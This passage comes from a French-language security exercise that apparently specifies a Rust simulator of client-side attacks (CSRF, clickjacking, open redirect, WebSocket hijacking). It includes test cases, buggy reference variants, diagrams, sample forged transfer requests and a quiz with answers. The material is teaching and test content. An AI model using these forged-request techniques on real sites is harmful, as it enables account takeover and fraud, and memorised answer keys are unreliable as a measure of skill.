        "name": "csrf_samesite_strict",
        "args": ["{\"attack_type\":\"CSRF\",\"target_request\":{\"method\":\"POST\",\"url\":\"https://bank.com/transfer\"},\"protections\":{\"samesite_cookie\":\"Strict\"}}"],
        "expected_contains": "exploitable\":false",
        "is_trap": true
      },
      {
        "name": "clickjacking_no_xframe",
        "args": ["{\"attack_type\":\"CLICKJACKING\",\"target_request\":{\"url\":\"https://bank.com\"},\"protections\":{}}"],
        "expected_contains": "<iframe",
        "is_trap": true
      },
      {
        "name": "open_redirect",
        "args": ["{\"attack_type\":\"OPEN_REDIRECT\",\"target_request\":{\"url\":\"https://legit.com/redirect\"},\"protections\":{\"redirect_validation\":\"none\"}}"],
        "expected_contains": "exploitable\":true",
        "is_trap": true
      },
      {
        "name": "cswsh",
        "args": ["{\"attack_type\":\"CSWSH\",\"target_request\":{\"url\":\"wss://bank.com/socket\"},\"protections\":{\"origin_check\":false}}"],
        "expected_contains": "WebSocket",
        "is_trap": true
      }
    ]
  }
}
```

---

### 4.10 Solutions Mutantes

#### Mutant A : Ignore SameSite=Lax

```rust
// âŒ Ne dÃ©tecte pas la protection partielle de Lax
fn analyze_csrf_mutant_a(samesite: &str) -> bool {
    match samesite {
        "Strict" => false,
        _ => true  // BUG: Lax traitÃ© comme None
    }
}
```

#### Mutant B : GÃ©nÃ¨re exploit mÃªme si protÃ©gÃ©

```rust
// âŒ GÃ©nÃ¨re toujours l'exploit
fn analyze_clickjacking_mutant_b() -> Output {
    // BUG: Ignore les protections
    Output {
        exploitable: true,  // Toujours true
        exploit_code: generate_iframe_exploit(),
        // ...
    }
}
```

#### Mutant C : Pas de bypass technique

```rust
// âŒ Ne propose pas de bypass pour SameSite=Lax
fn analyze_csrf_mutant_c(samesite: &str) -> Output {
    // BUG: bypass_technique toujours None
    Output {
        bypass_technique: None,  // Devrait suggÃ©rer GET
        // ...
    }
}
```

#### Mutant D : Oublie la remediation

```rust
// âŒ Pas de remediation
fn analyze_mutant_d() -> Output {
    Output {
        remediation: HashMap::new(),  // BUG: vide
        // ...
    }
}
```

---

## ğŸ§  SECTION 5 : COMPRENDRE

### 5.1 Ce que cet exercice enseigne

1. **CSRF** : Comment forcer le navigateur Ã  faire des requÃªtes non dÃ©sirÃ©es
2. **SameSite cookies** : La diffÃ©rence critique entre None, Lax et Strict
3. **Clickjacking** : Techniques de superposition d'iframes
4. **Open Redirect** : Exploitation de la confiance dans les URLs lÃ©gitimes
5. **CSWSH** : Hijacking de connexions WebSocket

---

### 5.3 Visualisation ASCII

#### CSRF Attack Flow

```
                            CSRF ATTACK FLOW

    VICTIME                 SITE MALVEILLANT              BANQUE
    (connectÃ©e)             (attaquant)                   (cible)
        â”‚                        â”‚                           â”‚
        â”‚  1. Visite la page     â”‚                           â”‚
        â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–º â”‚                           â”‚
        â”‚                        â”‚                           â”‚
        â”‚  2. Page avec form     â”‚                           â”‚
        â”‚ â—„â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚                           â”‚
        â”‚                        â”‚                           â”‚
        â”‚  3. Form auto-submit   â”‚                           â”‚
        â”‚  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–ºâ”‚
        â”‚  (avec cookies de      â”‚                           â”‚
        â”‚   session victime!)    â”‚                           â”‚
        â”‚                        â”‚                           â”‚
        â”‚                        â”‚                           â”‚ 4. Traite la
        â”‚                        â”‚                           â”‚    requÃªte
        â”‚                        â”‚                           â”‚    (transfert!)
        â”‚                        â”‚                           â”‚

    Le navigateur envoie AUTOMATIQUEMENT les cookies
    vers bank.com, mÃªme si la requÃªte vient de evil.com
```

#### Clickjacking Layers

```
                        CLICKJACKING LAYERS

    CE QUE LA VICTIME VOIT          CE QUI SE PASSE RÃ‰ELLEMENT
    â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€          â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚                     â”‚        â”‚  Layer 2 (z-index: 2)       â”‚
    â”‚   WIN A FREE        â”‚        â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
    â”‚     iPHONE!         â”‚        â”‚  â”‚     IFRAME            â”‚  â”‚
    â”‚                     â”‚        â”‚  â”‚  (opacity: 0.0001)    â”‚  â”‚
    â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚        â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚  â”‚
    â”‚  â”‚ CLAIM PRIZE! â”‚â—„â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”¼â”€â”€â”‚ DELETE ACCOUNT  â”‚â—„â”€â”¼â”€â”€â”‚
    â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚        â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚  â”‚
    â”‚                     â”‚        â”‚  â”‚     (real button)     â”‚  â”‚
    â”‚                     â”‚        â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜        â”‚                             â”‚
                                   â”‚  Layer 1 (z-index: 1)       â”‚
                                   â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
                                   â”‚  â”‚ CLAIM PRIZE! (decoy)  â”‚  â”‚
                                   â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
                                   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

    La victime clique sur "CLAIM PRIZE"
    mais clique en fait sur "DELETE ACCOUNT" dans l'iframe invisible
```

---

### 5.4 Les piÃ¨ges en dÃ©tail

#### PiÃ¨ge 1 : CORS vs CSRF confusion

```
CORS et CSRF sont DIFFÃ‰RENTS :

CORS (Cross-Origin Resource Sharing):
- ContrÃ´le si le JavaScript peut LIRE la rÃ©ponse
- N'empÃªche PAS la requÃªte d'Ãªtre envoyÃ©e
- ProtÃ¨ge la LECTURE des donnÃ©es

CSRF (Cross-Site Request Forgery):
- La requÃªte EST envoyÃ©e avec les cookies
- MÃªme sans lire la rÃ©ponse, l'ACTION est effectuÃ©e
- Une requÃªte POST qui fait un transfert = dÃ©gÃ¢ts mÃªme sans CORS

Exemple:
fetch('https://bank.com/transfer', {method: 'POST', body: 'to=attacker'})
// CORS bloque la LECTURE de la rÃ©ponse
// MAIS le transfert est FAIT cÃ´tÃ© serveur !
```

#### PiÃ¨ge 2 : SameSite=Lax permet les GET

```
SameSite=Lax PERMET les requÃªtes cross-site pour:
- GET via navigation top-level (<a href>, window.location)
- GET via <link rel=prerender>

NE permet PAS:
- POST cross-site
- GET via <img>, <iframe>, fetch(), XHR

DANGER: Si le serveur accepte GET pour les actions:
GET /transfer?to=attacker&amount=1000  â† FONCTIONNE avec Lax !
```

---

### 5.8 MnÃ©motechniques

#### ğŸ¤– MEME : "Mr. Robot" â€” Client-Side Attacks

*"People always make the best exploits."* â€” Elliot

Comme Elliot qui exploite la confiance et les habitudes des gens, les attaques client-side exploitent la confiance du navigateur envers les sites visitÃ©s.

```rust
// Le navigateur fait confiance Ã  bank.com
// Donc il envoie les cookies automatiquement
// MÃªme si la requÃªte vient de evil.com

// "Control is an illusion"
// Le serveur pense contrÃ´ler qui fait les requÃªtes
// Mais le navigateur de la victime peut Ãªtre manipulÃ©
```

---

## ğŸ“ SECTION 7 : QCM

### Question 1
**Quelle protection bloque complÃ¨tement les requÃªtes CSRF cross-site ?**

- A) SameSite=None
- B) SameSite=Lax
- C) SameSite=Strict
- D) CORS
- E) HTTPS
- F) CSP
- G) HSTS
- H) X-Frame-Options
- I) Referer-Policy
- J) Aucune

**RÃ©ponse : C** (Strict bloque tout cross-site)

---

### Question 2
**Que permet SameSite=Lax ?**

- A) Tous les cookies cross-site
- B) Uniquement les GET top-level navigation
- C) Uniquement les POST
- D) Aucun cookie cross-site
- E) Tous sauf les images
- F) Uniquement les iframes
- G) Uniquement les XHR
- H) Uniquement les fetch
- I) Uniquement les formulaires
- J) Tous les verbes HTTP

**RÃ©ponse : B**

---

### Question 3
**Quel header protÃ¨ge contre le clickjacking ?**

- A) X-Content-Type-Options
- B) X-Frame-Options
- C) X-XSS-Protection
- D) Content-Security-Policy (seul)
- E) Strict-Transport-Security
- F) Referrer-Policy
- G) Permissions-Policy
- H) Cross-Origin-Opener-Policy
- I) Cross-Origin-Resource-Policy
- J) Cache-Control

**RÃ©ponse : B** (et CSP frame-ancestors)

---

### Question 4
**Pourquoi CORS ne protÃ¨ge pas contre CSRF ?**

- A) CORS est dÃ©prÃ©ciÃ©
- B) CORS contrÃ´le la lecture, pas l'envoi de la requÃªte
- C) CORS ne fonctionne qu'en HTTPS
- D) CORS est uniquement pour les images
- E) CORS nÃ©cessite JavaScript
- F) CORS est cÃ´tÃ© client
- G) CORS bloque tous les cookies
- H) CORS requiert des headers
- I) CORS est optionnel
- J) CORS ne fonctionne pas avec POST

**RÃ©ponse : B**

---

### Question 5
**Quel CWE correspond Ã  CSRF ?**

- A) CWE-79
- B) CWE-89
- C) CWE-352
- D) CWE-601
- E) CWE-22
- F) CWE-1021
- G) CWE-918
- H) CWE-502
- I) CWE-287
- J) CWE-434

**RÃ©ponse : C**

---

## ğŸ“Š SECTION 8 : RÃ‰CAPITULATIF

| MÃ©trique | Valeur |
|----------|--------|
| **DifficultÃ©** | â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜†â˜†â˜† (7/10) |
| **Temps** | 240 minutes |
| **XP Base** | 300 |
| **CWE** | CWE-352, CWE-1021, CWE-601 |
| **Attaques** | CSRF, Clickjacking, Open Redirect, CSWSH |

---

## ğŸ“¦ SECTION 9 : DEPLOYMENT PACK

```json
{
  "deploy": {
    "hackbrain_version": "5.5.2",
    "exercise_slug": "3.3.8-a-client-side-attack-simulator",
    "metadata": {
      "exercise_id": "3.3.8-a",
      "module": "3.3.8",
      "difficulty": 7,
      "language": "rust",
      "meme_reference": "Mr. Robot"
    }
  }
}
```

---

*Exercise crÃ©Ã© selon HACKBRAIN v5.5.2 â€” "Mr. Robot"*
